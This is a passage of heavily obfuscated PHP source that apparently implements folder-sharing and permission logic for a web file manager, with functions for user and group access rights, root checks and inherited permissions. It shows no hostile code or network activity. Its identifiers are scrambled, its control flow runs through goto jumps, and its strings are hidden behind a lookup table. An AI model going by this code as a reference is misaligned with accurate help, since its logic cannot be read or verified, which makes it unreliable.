$c¡ÜË´¡§Î = count(explode($A¦¦Ç¦Éªô[8], trim($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[492]], $A¦¦Ç¦Éªô[8]))); $BŒœñ’Ó˜‚[] = $c¡ÜË´¡§Î + ($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[29]] == $A¦¦Ç¦Éªô[76] ? 0 : 1000); goto C”Ûöâ ×Ø; d¯†ÀÀ™õƒ: $CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[2304]] = $this->authTargetInfo($cø—ŸöŞ˜Ğ); $CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[492]] = rtrim($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[488]], $A¦¦Ç¦Éªô[8]) . $A¦¦Ç¦Éªô[8] . ltrim($CáÅ•ù­éÓ[$A¦¦Ç¦Éªô[492]], $A¦¦Ç¦Éªô[8]); $aâÂáââÍ[] = $CáÅ•ù­éÓ; goto EˆŠÈĞ°«¤; C”Ûöâ ×Ø: } array_multisort($BŒœñ’Ó˜‚, SORT_ASC, $aâÂáââÍ); goto f™œ·“˜ï; E¹Ä¦Ú¥ïí: $A¦¦Ç¦Éªô =& $_SERVER[åÌÛ»ô¢‚ö™]; $F‡›Ò¨ÇÉ = Model($A¦¦Ç¦Éªô[1143])->sourceListInfo($bƒóôê°˜Õ, !0); $eÔÈç¸à­« = $A¦¦Ç¦Éªô[2300]; goto EáøèŞÜ–½; f™œ·“˜ï: return $aâÂáââÍ; goto CôÆÙõØ§Œ; EáøèŞÜ–½: $E¢ê›¯åÂ  = $this->field($eÔÈç¸à­«)->where(array($A¦¦Ç¦Éªô[394] => array($A¦¦Ç¦Éªô[7], $bƒóôê°˜Õ)))->select(); $e†ÓµÓº» = array_to_keyvalue_group($E¢ê›¯åÂ , $A¦¦Ç¦Éªô[394]); $aâÂáââÍ = array(); goto F÷œˆ›ØŒ„; CôÆÙõØ§Œ: } private function groupChidldAllRootSource($E„“‹èó©…) { $a–çÅõé•Š =& $_SERVER[åÌÛ»ô¢‚ö™]; $B±ÄÖ‚Œ…µ = Model($a–çÅõé•Š[2305])->groupChildrenAll($E„“‹èó©…); $d–¬¶©‘ÇÀ = array($a–çÅõé•Š[487] => 0, $a–çÅõé•Š[482] => array($a–çÅõé•Š[7], $B±ÄÖ‚Œ…µ), $a–çÅõé•Š[396] => SourceModel::TYPE_GROUP); $fÅ¹ø÷¢ÃÇ = Model($a–çÅõé•Š[778])->field($a–çÅõé•Š[394])->where($d–¬¶©‘ÇÀ)->select(); $fÅ¹ø÷¢ÃÇ = array_to_keyvalue($fÅ¹ø÷¢ÃÇ, $a–çÅõé•Š[33], $a–çÅõé•Š[394]); return $fÅ¹ø÷¢ÃÇ; } private function authTargetInfo($F¡á¢§’ì°) { goto aíõÆëø‹¤; aíõÆëø‹¤: $C• ÒÂ”½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aºĞá‡á†ä = array(); $BµöÏ‰šÓœ = array(); goto B†³§“à; f¿æ¢˜®Æ: return $aºĞá‡á†ä; goto FÎ•ó©˜–à; B†³§“à: $aµÈÚ—Õµ„ = 2 << 25; foreach ($F¡á¢§’ì° as $fœÊæ¥Ğò‰) { goto d®Š‹Ş±”•; F†¸¤ùœõ: if (!$eé”Õ‹óê) { continue; } $eé”Õ‹óê[$C• ÒÂ”½[443]] = $Fùäç®£©; $aºĞá‡á†ä[] = $eé”Õ‹óê; goto CíœŒËĞ†Ê; d®Š‹Ş±”•: $Fùäç®£© = Model($C• ÒÂ”½[2301])->listData($fœÊæ¥Ğò‰[$C• ÒÂ”½[2282]]); if (!$Fùäç®£©) { continue; } if ($fœÊæ¥Ğò‰[$C• ÒÂ”½[396]] == SourceModel::TYPE_USER) { $eé”Õ‹óê = Model($C• ÒÂ”½[500])->getInfoSimpleOuter($fœÊæ¥Ğò‰[$C• ÒÂ”½[482]]); if ($eé”Õ‹óê[$C• ÒÂ”½[1465]] == $C• ÒÂ”½[1058]) { continue; } if ($eé”Õ‹óê[$C• ÒÂ”½[1465]] == $C• ÒÂ”½[494]) { $eé”Õ‹óê[$C• ÒÂ”½[28]] = LNG($C• ÒÂ”½[2306]); } } else { $eé”Õ‹óê = Model($C• ÒÂ”½[484])->getInfoSimple($fœÊæ¥Ğò‰[$C• ÒÂ”½[482]]); } goto F†¸¤ùœõ; AáÃ¹½ŠÎÌ: if ($fœÊæ¥Ğò‰[$C• ÒÂ”½[396]] == SourceModel::TYPE_USER && $fœÊæ¥Ğò‰[$C• ÒÂ”½[482]] == $C• ÒÂ”½[494]) { $Fµ»£ã…¦Û = 0; } $BµöÏ‰šÓœ[] = $Fùäç®£©[$C• ÒÂ”½[401]] + $Fµ»£ã…¦Û; goto A¨ŠÛË÷¿É; CíœŒËĞ†Ê: $Fµ»£ã…¦Û = 0; if ($fœÊæ¥Ğò‰[$C• ÒÂ”½[396]] == SourceModel::TYPE_GROUP) { $Fµ»£ã…¦Û = $aµÈÚ—Õµ„ * 2; } if ($fœÊæ¥Ğò‰[$C• ÒÂ”½[396]] == SourceModel::TYPE_USER) { $Fµ»£ã…¦Û = $aµÈÚ—Õµ„; } goto AáÃ¹½ŠÎÌ; A¨ŠÛË÷¿É: } array_multisort($BµöÏ‰šÓœ, SORT_DESC, $aºĞá‡á†ä); goto f¿æ¢˜®Æ; FÎ•ó©˜–à: } public function getAllChildrenByUser($a—›È ‡ã, $e ‘™ø¨‰) { goto B³êƒÏÓÔ”; c¤½º«õ¼¿: if ($fëËœ¹­í[$e±ÁæÔôõ®[487]] == $e±ÁæÔôõ®[494] && $fëËœ¹­í[$e±ÁæÔôõ®[482]] != $f­Ğà½Êœµ && $this->groupContainUser($fëËœ¹­í[$e±ÁæÔôõ®[482]], $e ‘™ø¨‰)) { foreach ($cÏ§õóœ„[$e±ÁæÔôõ®[2307]] as $aæ½ØªœÍô) { $c±‡¥Ì”›™ = Model($e±ÁæÔôõ®[484])->getInfo($aæ½ØªœÍô[$e±ÁæÔôõ®[2138]]); $A­ÇİÖªŞ = Model($e±ÁæÔôõ®[503])->getInfoSimpleOuter($e ‘™ø¨‰); $A­ÇİÖªŞ[$e±ÁæÔôõ®[443]] = $aæ½ØªœÍô[$e±ÁæÔôõ®[401]]; if (Model($e±ÁæÔôõ®[2301])->authCheckAction($aæ½ØªœÍô[$e±ÁæÔôõ®[401]][$e±ÁæÔôõ®[401]], $e±ÁæÔôõ®[1594])) { continue; } $aÃ½»Üàâõ = array($e±ÁæÔôõ®[28] => $e±ÁæÔôõ®[1417] . $c±‡¥Ì”›™[$e±ÁæÔôõ®[28]], $e±ÁæÔôõ®[394] => $c±‡¥Ì”›™[$e±ÁæÔôõ®[416]][$e±ÁæÔôõ®[394]], $e±ÁæÔôõ®[75] => KodIO::make($c±‡¥Ì”›™[$e±ÁæÔôõ®[416]][$e±ÁæÔôõ®[394]]), $e±ÁæÔôõ®[487] => $e±ÁæÔôõ®[494], $e±ÁæÔôõ®[396] => $e±ÁæÔôõ®[993], $e±ÁæÔôõ®[29] => $e±ÁæÔôõ®[514], $e±ÁæÔôõ®[492] => $c±‡¥Ì”›™[$e±ÁæÔôõ®[489]], $e±ÁæÔôõ®[2138] => $c±‡¥Ì”›™[$e±ÁæÔôõ®[2138]], $e±ÁæÔôõ®[486] => $c±‡¥Ì”›™[$e±ÁæÔôõ®[487]], $e±ÁæÔôõ®[2304] => array($A­ÇİÖªŞ)); $e¬ãÇ¾íóÚ[$aÃ½»Üàâõ[$e±ÁæÔôõ®[394]]] = $aÃ½»Üàâõ; } } $F‘¹ßô£³ = array(); $f›çë£Œ¢Â = $this->getAllChildren($a—›È ‡ã); goto bÁÉà†ö; bÁÉà†ö: foreach ($f›çë£Œ¢Â as $eŸÅá—ˆíÈ) { $f¹ò×»öš = !1; foreach ($eŸÅá—ˆíÈ[$e±ÁæÔôõ®[2304]] as $fê’ŠµÒªŠ) { if ($fê’ŠµÒªŠ[$e±ÁæÔôõ®[1465]]) { if ($fê’ŠµÒªŠ[$e±ÁæÔôõ®[1465]] == $e ‘™ø¨‰) { $f¹ò×»öš = !0; break; } } if ($fê’ŠµÒªŠ[$e±ÁæÔôõ®[2138]]) { if ($this->groupContainUser($fê’ŠµÒªŠ[$e±ÁæÔôõ®[2138]], $e ‘™ø¨‰)) { $f¹ò×»öš = !0; break; } } } if ($f¹ò×»öš) { $F‘¹ßô£³[] = $eŸÅá—ˆíÈ; } $EÏ¦İØÛÄ = $eŸÅá—ˆíÈ[$e±ÁæÔôõ®[394]]; if (isset($e¬ãÇ¾íóÚ[$EÏ¦İØÛÄ])) { $eŸÅá—ˆíÈ[$e±ÁæÔôõ®[2304]][] = $e¬ãÇ¾íóÚ[$EÏ¦İØÛÄ][0]; $e¬ãÇ¾íóÚ[$EÏ¦İØÛÄ] = !1; } } $e¬ãÇ¾íóÚ = array_filter(array_values($e¬ãÇ¾íóÚ)); $F‘¹ßô£³ = array_merge($e¬ãÇ¾íóÚ, $F‘¹ßô£³); goto ağŠï“œê„; AÃÈïœº: $fëËœ¹­í = Model($e±ÁæÔôõ®[1143])->sourceInfo($a—›È ‡ã); $e¬ãÇ¾íóÚ = array(); $f­Ğà½Êœµ = 1; goto c¤½º«õ¼¿; B³êƒÏÓÔ”: $e±ÁæÔôõ® =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÏ§õóœ„ = Model($e±ÁæÔôõ®[503])->getInfo($e ‘™ø¨‰); if (!$e ‘™ø¨‰ || !$a—›È ‡ã || !$cÏ§õóœ„) { return array(); } goto AÃÈïœº; ağŠï“œê„: return $F‘¹ßô£³; goto c¸ÊíÓ‡ğ; c¸ÊíÓ‡ğ: } public function setAllChildrenByUser($añÍà“¡»Ÿ, $bÌÆôô–±ø, $E¶·¨’¹³î) { $c“Â²é§˜Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÏìì×ŒĞ‚ = $this->getAllChildrenByUser($añÍà“¡»Ÿ, $bÌÆôô–±ø); if (!$E¶·¨’¹³î || !$dÏìì×ŒĞ‚) { return !1; } foreach ($dÏìì×ŒĞ‚ as $f¸˜§”ÜÌ) { $cÚâ‹ã¹‚Ş = array(); foreach ($f¸˜§”ÜÌ[$c“Â²é§˜Õ[2304]] as $d‘†ò´ñ) { $d¢Ñ»„Èê = $d‘†ò´ñ[$c“Â²é§˜Õ[443]]; $eÛŠÇ½Ãİ = $d‘†ò´ñ[$c“Â²é§˜Õ[1465]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $C¼òÙàïèÃ = $d‘†ò´ñ[$c“Â²é§˜Õ[1465]] ? $d‘†ò´ñ[$c“Â²é§˜Õ[1465]] : $d‘†ò´ñ[$c“Â²é§˜Õ[2138]]; if ($d‘†ò´ñ[$c“Â²é§˜Õ[1465]] && $d‘†ò´ñ[$c“Â²é§˜Õ[1465]] == $bÌÆôô–±ø) { continue; } $cÚâ‹ã¹‚Ş[] = array($c“Â²é§˜Õ[394] => $f¸˜§”ÜÌ[$c“Â²é§˜Õ[394]], $c“Â²é§˜Õ[396] => $eÛŠÇ½Ãİ, $c“Â²é§˜Õ[482] => intval($C¼òÙàïèÃ), $c“Â²é§˜Õ[2282] => isset($d¢Ñ»„Èê[$c“Â²é§˜Õ[392]]) ? intval($d¢Ñ»„Èê[$c“Â²é§˜Õ[392]]) : 0, $c“Â²é§˜Õ[2283] => isset($d¢Ñ»„Èê[$c“Â²é§˜Õ[2283]]) ? intval($d¢Ñ»„Èê[$c“Â²é§˜Õ[2283]]) : -1); } $cÚâ‹ã¹‚Ş[] = array($c“Â²é§˜Õ[394] => $f¸˜§”ÜÌ[$c“Â²é§˜Õ[394]], $c“Â²é§˜Õ[396] => SourceModel::TYPE_USER, $c“Â²é§˜Õ[482] => intval($bÌÆôô–±ø), $c“Â²é§˜Õ[2282] => intval($E¶·¨’¹³î), $c“Â²é§˜Õ[2283] => -1); $this->where(array($c“Â²é§˜Õ[408] => $f¸˜§”ÜÌ[$c“Â²é§˜Õ[394]]))->delete(); $this->addAll($cÚâ‹ã¹‚Ş); } return !0; } public function get($D«òÛ˜î–) { $c³ÊçÛòÕÄ = $this->getSourceList(array($D«òÛ˜î–), !0); return $c³ÊçÛòÕÄ[0]; } public function getSourceList($EòŸºìÖîì, $f™ƒˆìêä‡ = false, $eÅØ†…— = false) { goto E ƒ§ËÆëŠ; a¥Ğ¥‰à‰Ş: $CİÅŒ¾ˆ¿§ = array_to_keyvalue_group($CİÅŒ¾ˆ¿§, $C±ƒî½‡¼Ç[394]); $B·«¦„’£ = array(); foreach ($a˜ìâ±Éƒ¦ as $cŒÈ§—›¸) { if (isset($CİÅŒ¾ˆ¿§[$cŒÈ§—›¸])) { $B·«¦„’£[$cŒÈ§—›¸] = $CİÅŒ¾ˆ¿§[$cŒÈ§—›¸]; } } goto f…ƒÓòİ¿Á; AÁß¨°¾²Œ: if (!$f™ƒˆìêä‡ && count($EòŸºìÖîì) == 1) { $f™ƒˆìêä‡ = array(); $f™ƒˆìêä‡[$EòŸºìÖîì[0]] = $E…ÜÅƒÄ¦—->sourceInfo($EòŸºìÖîì[0]); } if (!$f™ƒˆìêä‡) { $fË‚Ìò©Øò = array($C±ƒî½‡¼Ç[408] => array($C±ƒî½‡¼Ç[409], $EòŸºìÖîì)); $f™ƒˆìêä‡ = $E…ÜÅƒÄ¦—->field($C±ƒî½‡¼Ç[2308])->where($fË‚Ìò©Øò)->select(); $f™ƒˆìêä‡ = array_to_keyvalue($f™ƒˆìêä‡, $C±ƒî½‡¼Ç[394]); } $a˜ìâ±Éƒ¦ = $EòŸºìÖîì; goto fĞÒ‚¼ù£È; f…ƒÓòİ¿Á: $C’öêÔ±Í = $this->userIsRoot($eÅØ†…—); $bŞæˆ£ËÄ = AuthModel::authAll(); $ešÆ‘ë¶ñò = array($C±ƒî½‡¼Ç[402] => $bŞæˆ£ËÄ, $C±ƒî½‡¼Ç[2310] => array($C±ƒî½‡¼Ç[410] => 0, $C±ƒî½‡¼Ç[2144] => $bŞæˆ£ËÄ, $C±ƒî½‡¼Ç[411] => LNG($C±ƒî½‡¼Ç[2311]), $C±ƒî½‡¼Ç[2158] => $C±ƒî½‡¼Ç[2312])); goto C‰´¸Ê¾Ïà; d…ª¡ä£ƒƒ: $a¾×Ó¥­ = $C±ƒî½‡¼Ç[2309]; $fË‚Ìò©Øò = array($C±ƒî½‡¼Ç[408] => array($C±ƒî½‡¼Ç[409], $a˜ìâ±Éƒ¦)); $CİÅŒ¾ˆ¿§ = $this->field($a¾×Ó¥­)->where($fË‚Ìò©Øò)->select(); goto a¥Ğ¥‰à‰Ş; C‰´¸Ê¾Ïà: $aÖµõ”èˆ¤ = array(); foreach ($f™ƒˆìêä‡ as $cŒÈ§—›¸ => $e£Âé‹•ªÖ) { if ($C’öêÔ±Í) { $aÖµõ”èˆ¤[$cŒÈ§—›¸] = $ešÆ‘ë¶ñò; continue; } $aÖµõ”èˆ¤[$cŒÈ§—›¸] = $this->makeSourceAuth($e£Âé‹•ªÖ, $B·«¦„’£, $eÅØ†…—); } return $aÖµõ”èˆ¤; goto DÂÈ„İåÉ; fĞÒ‚¼ù£È: foreach ($f™ƒˆìêä‡ as $C¨‰áæ„«Œ => $E¤Ûƒ…ëˆ÷) { $A¦”»›”²º = $E…ÜÅƒÄ¦—->parentLevelArray($E¤Ûƒ…ëˆ÷[$C±ƒî½‡¼Ç[485]]); $a˜ìâ±Éƒ¦ = array_merge($a˜ìâ±Éƒ¦, array($C¨‰áæ„«Œ), array_reverse($A¦”»›”²º)); } $a˜ìâ±Éƒ¦ = array_values(array_unique($a˜ìâ±Éƒ¦)); if (!$a˜ìâ±Éƒ¦) { return array(); } goto d…ª¡ä£ƒƒ; E ƒ§ËÆëŠ: $C±ƒî½‡¼Ç =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$EòŸºìÖîì) { return array(); } $E…ÜÅƒÄ¦— = Model($C±ƒî½‡¼Ç[1143]); goto AÁß¨°¾²Œ; DÂÈ„İåÉ: } public function authDeepCheck($A†„˜‘Ç«•, $cè¨ª¬š» = false) { goto EÆçé‡°ƒ; eùâ¡Ü¼ëÊ: if (!in_array($A†„˜‘Ç«•, $BË¼Ù»èò‚[$D­¢‰‡ó¿‡[2313]])) { return !1; } $D„›ï–æ¨Û = array(); foreach ($BË¼Ù»èò‚[$D­¢‰‡ó¿‡[2314]] as $e­íÉÙ±Ä´ => $Aä‰¥á°Œô) { if (!in_array($A†„˜‘Ç«•, $Aä‰¥á°Œô)) { continue; } $D„›ï–æ¨Û[] = $e­íÉÙ±Ä´; } goto Cªåƒ¹Çº; EÆçé‡°ƒ: $D­¢‰‡ó¿‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cè¨ª¬š» = $cè¨ª¬š» ? $cè¨ª¬š» : USER_ID; $BË¼Ù»èò‚ = $this->makeAuthDeep($cè¨ª¬š»); goto eùâ¡Ü¼ëÊ; Cªåƒ¹Çº: $eÀŒîÁ‰Û = $D„›ï–æ¨Û ? $D„›ï–æ¨Û[0] : $A†„˜‘Ç«•; return array($D­¢‰‡ó¿‡[402] => -1, $D­¢‰‡ó¿‡[443] => array($D­¢‰‡ó¿‡[410] => $D­¢‰‡ó¿‡[1058], $D­¢‰‡ó¿‡[2144] => $D­¢‰‡ó¿‡[494], $D­¢‰‡ó¿‡[411] => LNG($D­¢‰‡ó¿‡[2315]), $D­¢‰‡ó¿‡[2158] => $D­¢‰‡ó¿‡[2316]), $D­¢‰‡ó¿‡[2317] => LNG($D­¢‰‡ó¿‡[2318]), $D­¢‰‡ó¿‡[2319] => $this->sourceAuthInfo($eÀŒîÁ‰Û)); goto FÚ‚¨è; FÚ‚¨è: } protected function makeAuthDeep($Dáœ¦µÅÍÖ = false) { goto d¥¼é§ñ; d¿¨ãâáéå: $a›¾Ç§İ÷Ò[$Dáœ¦µÅÍÖ] = $aàÀšĞ¿Œ; return $aàÀšĞ¿Œ; goto FÈöÃ„‡‰Ó; dÂ·áÕ¦™‘: $Cç‡ÑÑ°© = array_to_keyvalue($E¤ÇÀù©œÈ, $e·é†’‘ÍÜ[33], $e·é†’‘ÍÜ[394]); $CÛ„Ò–ß = array(); $EÙ‰‰Ÿ¼ = $eœÍ¢Æ½¼—; goto aòíî‹ÅĞ×; fˆ©Ãíäô×: if ($Cç‡ÑÑ°©) { $CœºÈ¤ÛØ = $fĞİé‰Ü¦ƒ->where(array($e·é†’‘ÍÜ[394] => array($e·é†’‘ÍÜ[409], $Cç‡ÑÑ°©)))->select(); foreach ($CœºÈ¤ÛØ as $BÏ¼ÌÈÓÁ) { $cŠ¤«Ú·•ø = $fĞİé‰Ü¦ƒ->parentLevelArray($BÏ¼ÌÈÓÁ[$e·é†’‘ÍÜ[485]]); $CÛ„Ò–ß = array_merge($CÛ„Ò–ß, $cŠ¤«Ú·•ø); $EÙ‰‰Ÿ¼[] = $BÏ¼ÌÈÓÁ[$e·é†’‘ÍÜ[482]]; $bìÏÇ½—×[$BÏ¼ÌÈÓÁ[$e·é†’‘ÍÜ[394]]] = $cŠ¤«Ú·•ø; $d›æİ¡““Ü[$BÏ¼ÌÈÓÁ[$e·é†’‘ÍÜ[394]]] = $BÏ¼ÌÈÓÁ[$e·é†’‘ÍÜ[482]]; } } $EÙ‰‰Ÿ¼ = array_values(array_unique($EÙ‰‰Ÿ¼)); $cÎÙòÔºøÊ = $EÙ‰‰Ÿ¼; goto fóãöìÊ¤¶; e•’‚æ¥: if ($eœÍ¢Æ½¼—) { $aÌá¼„È­Ğ = array(array($e·é†’‘ÍÜ[396] => SourceModel::TYPE_USER, $e·é†’‘ÍÜ[482] => $Dáœ¦µÅÍÖ), array($e·é†’‘ÍÜ[396] => SourceModel::TYPE_GROUP, $e·é†’‘ÍÜ[482] => array($e·é†’‘ÍÜ[409], $eœÍ¢Æ½¼—)), $e·é†’‘ÍÜ[935] => $e·é†’‘ÍÜ[2223]); } if ($c­é¤ÃÉ­¾) { $aÌá¼„È­Ğ = array($aÌá¼„È­Ğ, $e·é†’‘ÍÜ[2282] => array($e·é†’‘ÍÜ[2321], $c­é¤ÃÉ­¾)); } $E¤ÇÀù©œÈ = $this->field($e·é†’‘ÍÜ[2322])->where($aÌá¼„È­Ğ)->select(); goto dÂ·áÕ¦™‘; fß…ÒÊ„Ì: if (isset($a›¾Ç§İ÷Ò[$Dáœ¦µÅÍÖ])) { return $a›¾Ç§İ÷Ò[$Dáœ¦µÅÍÖ]; } $D´‚…Óó¥ = Model($e·é†’‘ÍÜ[2320])->listData(); $c­é¤ÃÉ­¾ = array(); goto D‡İ £„…Á; DÌÃˆÒó†: foreach ($bìÏÇ½—× as $aÏª‘¦ÓİÖ => $cÖŒššªÅ¦) { $d±ğ©÷ª“Â = $d›æİ¡““Ü[$aÏª‘¦ÓİÖ]; if (!$d±ğ©÷ª“Â || !$dÉöÙÙĞº¸[$d±ğ©÷ª“Â]) { continue; } $C„‘âš·í§ = array(); foreach ($f®à¤­“‚ [$d±ğ©÷ª“Â] as $fâ‘ø®¤¤) { $C„‘âš·í§[] = $dÉöÙÙĞº¸[$fâ‘ø®¤¤]; } $bìÏÇ½—×[$aÏª‘¦ÓİÖ] = array_merge($C„‘âš·í§, $cÖŒššªÅ¦); } $CÛ„Ò–ß = array_values(array_unique($CÛ„Ò–ß)); $aàÀšĞ¿Œ = array($e·é†’‘ÍÜ[2313] => $CÛ„Ò–ß, $e·é†’‘ÍÜ[2314] => $bìÏÇ½—×); goto d¿¨ãâáéå; D‡İ £„…Á: foreach ($D´‚…Óó¥ as $dê˜©ëœ·Ú) { if ($dê˜©ëœ·Ú[$e·é†’‘ÍÜ[401]] == 0 && $dê˜©ëœ·Ú[$e·é†’‘ÍÜ[2159]] == $e·é†’‘ÍÜ[83]) { $c­é¤ÃÉ­¾[] = $dê˜©ëœ·Ú[$e·é†’‘ÍÜ[392]]; } } $eœÍ¢Æ½¼— = $this->userGroupParents($Dáœ¦µÅÍÖ); $aÌá¼„È­Ğ = array($e·é†’‘ÍÜ[396] => SourceModel::TYPE_USER, $e·é†’‘ÍÜ[482] => $Dáœ¦µÅÍÖ); goto e•’‚æ¥; d¥¼é§ñ: $e·é†’‘ÍÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $a›¾Ç§İ÷Ò = array(); $Dáœ¦µÅÍÖ = $Dáœ¦µÅÍÖ ? $Dáœ¦µÅÍÖ : USER_ID; goto fß…ÒÊ„Ì; aòíî‹ÅĞ×: $fĞİé‰Ü¦ƒ = Model($e·é†’‘ÍÜ[1143]); $Dæˆ§ˆ° = Model($e·é†’‘ÍÜ[484]); $bìÏÇ½—× = array(); goto AÕ¯Ì®; fóãöìÊ¤¶: foreach ($cÎÙòÔºøÊ as $fâ‘ø®¤¤) { $AªÈ–‚º½¨ = $Dæˆ§ˆ°->getInfo($fâ‘ø®¤¤); $cŠ¤«Ú·•ø = $fĞİé‰Ü¦ƒ->parentLevelArray($AªÈ–‚º½¨[$e·é†’‘ÍÜ[485]]); $EÙ‰‰Ÿ¼ = array_merge($EÙ‰‰Ÿ¼, $cŠ¤«Ú·•ø); } $EÙ‰‰Ÿ¼ = array_values(array_unique($EÙ‰‰Ÿ¼)); foreach ($EÙ‰‰Ÿ¼ as $fâ‘ø®¤¤) { $AªÈ–‚º½¨ = $Dæˆ§ˆ°->getInfo($fâ‘ø®¤¤); $CÛ„Ò–ß[] = $AªÈ–‚º½¨[$e·é†’‘ÍÜ[416]][$e·é†’‘ÍÜ[394]]; $dÉöÙÙĞº¸[$fâ‘ø®¤¤] = $AªÈ–‚º½¨[$e·é†’‘ÍÜ[416]][$e·é†’‘ÍÜ[394]]; $f®à¤­“‚ [$fâ‘ø®¤¤] = $fĞİé‰Ü¦ƒ->parentLevelArray($AªÈ–‚º½¨[$e·é†’‘ÍÜ[485]]); } goto DÌÃˆÒó†; AÕ¯Ì®: $d›æİ¡““Ü = array(); $dÉöÙÙĞº¸ = array(); $f®à¤­“‚  = array(); goto fˆ©Ãíäô×; FÈöÃ„‡‰Ó: } private function makeSourceAuth($B©Ç ÀÎÎÏ, $B¬õ·Š£ëì, $a±©ôµ˜µÑ = false) { goto e¨åÀ¶á‰ä; BÈ°¾«êˆã: if (!$Cä¼ôß„½†) { $B§Şì‹à¹Û = Model($Eâøç©¼•Ç[484])->getInfo($bäÖŒÑ†îª); $E»¹’’”˜ß = explode($Eâøç©¼•Ç[47], trim($B§Şì‹à¹Û[$Eâøç©¼•Ç[485]], $Eâøç©¼•Ç[47])); foreach ($E»¹’’”˜ß as $A¦–Šƒ£•ê) { if ($A¦–Šƒ£•ê == $Eâøç©¼•Ç[494] || $A¦–Šƒ£•ê == $DÎâ’ôö¯) { continue; } $b¬œŒÚá° = $this->groupRootAuth($A¦–Šƒ£•ê, $a±©ôµ˜µÑ); if (!$b¬œŒÚá°) { continue; } $Cä¼ôß„½† = $this->groupAuthInfo($b¬œŒÚá°, $A¦–Šƒ£•ê); break; } } if (!$Cä¼ôß„½† || $Cä¼ôß„½†[$Eâøç©¼•Ç[402]] <= 0) { $eµÚŞ¤ºõõ = $this->authDeepCheck($B©Ç ÀÎÎÏ[$Eâøç©¼•Ç[394]], $a±©ôµ˜µÑ); if ($eµÚŞ¤ºõõ) { $Cä¼ôß„½† = $eµÚŞ¤ºõõ; } } return $Cä¼ôß„½†; goto aëÜÂã–“Ø; eëÃíñáí: $DÜŠƒĞÚË = $B©Ç ÀÎÎÏ[$Eâøç©¼•Ç[396]] == SourceModel::TYPE_GROUP; $bÛÁ”† ™ = $DÜŠƒĞÚË ? $this->groupRootAuth($bäÖŒÑ†îª, $a±©ôµ˜µÑ) : !1; if ($bÛÁ”† ™ && Model($Eâøç©¼•Ç[2301])->authCheckAction($bÛÁ”† ™[$Eâøç©¼•Ç[401]], $Eâøç©¼•Ç[1594])) { return $this->groupAuthInfo($bÛÁ”† ™, $bäÖŒÑ†îª); } goto FÄºíøÉŞÔ; e¨åÀ¶á‰ä: $Eâøç©¼•Ç =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÎâ’ôö¯ = $Eâøç©¼•Ç[83]; $bäÖŒÑ†îª = $B©Ç ÀÎÎÏ[$Eâøç©¼•Ç[482]]; goto eëÃíñáí; d„–ÏÍ‚: foreach ($F²“†Ãƒ¿« as $b§šÑ·ªŞå) { if (!isset($B¬õ·Š£ëì[$b§šÑ·ªŞå])) { continue; } $AÏ®±Ù†Ú… = $this->authMake($B¬õ·Š£ëì[$b§šÑ·ªŞå], $a±©ôµ˜µÑ); if ($AÏ®±Ù†Ú…[$Eâøç©¼•Ç[443]]) { $Cä¼ôß„½† = $AÏ®±Ù†Ú…; break; } } if (!$DÜŠƒĞÚË) { return $Cä¼ôß„½†; } if (!$Cä¼ôß„½† && $bÛÁ”† ™) { $Cä¼ôß„½† = $this->groupAuthInfo($bÛÁ”† ™, $bäÖŒÑ†îª); } goto BÈ°¾«êˆã; FÄºíøÉŞÔ: $F²“†Ãƒ¿« = Model($Eâøç©¼•Ç[1143])->parentLevelArray($B©Ç ÀÎÎÏ[$Eâøç©¼•Ç[485]]); $F²“†Ãƒ¿« = array_merge(array($B©Ç ÀÎÎÏ[$Eâøç©¼•Ç[394]]), array_reverse($F²“†Ãƒ¿«)); $Cä¼ôß„½† = !1; goto d„–ÏÍ‚; aëÜÂã–“Ø: } private function userIsRoot($b«¼ò¾éÏò = false) { $BÈ‘¿ÉÛ¡§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$b«¼ò¾éÏò && _get($GLOBALS, $BÈ‘¿ÉÛ¡§[483])) { return !0; } $F¾õˆÀÒ² = Model($BÈ‘¿ÉÛ¡§[503])->getInfo($b«¼ò¾éÏò); $b¬°§Æˆ = Model($BÈ‘¿ÉÛ¡§[2323])->listData($F¾õˆÀÒ²[$BÈ‘¿ÉÛ¡§[1347]]); if ($b¬°§Æˆ && $b¬°§Æˆ[$BÈ‘¿ÉÛ¡§[1219]][$BÈ‘¿ÉÛ¡§[2324]] == 1) { return !0; } return !1; } private function sourceAuthInfo($BØÖ³˜‚Êé) { goto CÎùöà´ƒç; CÎùöà´ƒç: $Eèä÷ªôß‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÜ³Ï™Š†å = Model($Eèä÷ªôß‰[1143]); $có¼ÃÍ³ù‰ = $DÜ³Ï™Š†å->sourceInfo($BØÖ³˜‚Êé); goto CŒ»æ¿à›; DßŞ«ù‚Ñ: if (isset($có¼ÃÍ³ù‰[$Eèä÷ªôß‰[490]])) { $fç´èÁĞø = explode($Eèä÷ªôß‰[8], trim($có¼ÃÍ³ù‰[$Eèä÷ªôß‰[492]], $Eèä÷ªôß‰[8])); array_shift($fç´èÁĞø); $FÊÆÖÊ“ƒ = $có¼ÃÍ³ù‰[$Eèä÷ªôß‰[488]] . $Eèä÷ªôß‰[2325] . implode($Eèä÷ªôß‰[8], $fç´èÁĞø); } return array($Eèä÷ªôß‰[411] => $có¼ÃÍ³ù‰[$Eèä÷ªôß‰[28]], $Eèä÷ªôß‰[75] => KodIO::make($có¼ÃÍ³ù‰[$Eèä÷ªôß‰[394]]), $Eèä÷ªôß‰[2326] => $FÊÆÖÊ“ƒ); goto aóÓ©¡’; DâãÜœ§£: $d†‡Çáø†÷ = $DÜ³Ï™Š†å->_listAppendPath($d†‡Çáø†÷); $có¼ÃÍ³ù‰ = $d†‡Çáø†÷[0]; $FÊÆÖÊ“ƒ = $có¼ÃÍ³ù‰[$Eèä÷ªôß‰[492]]; goto DßŞ«ù‚Ñ; CŒ»æ¿à›: if (!$có¼ÃÍ³ù‰) { return !1; } 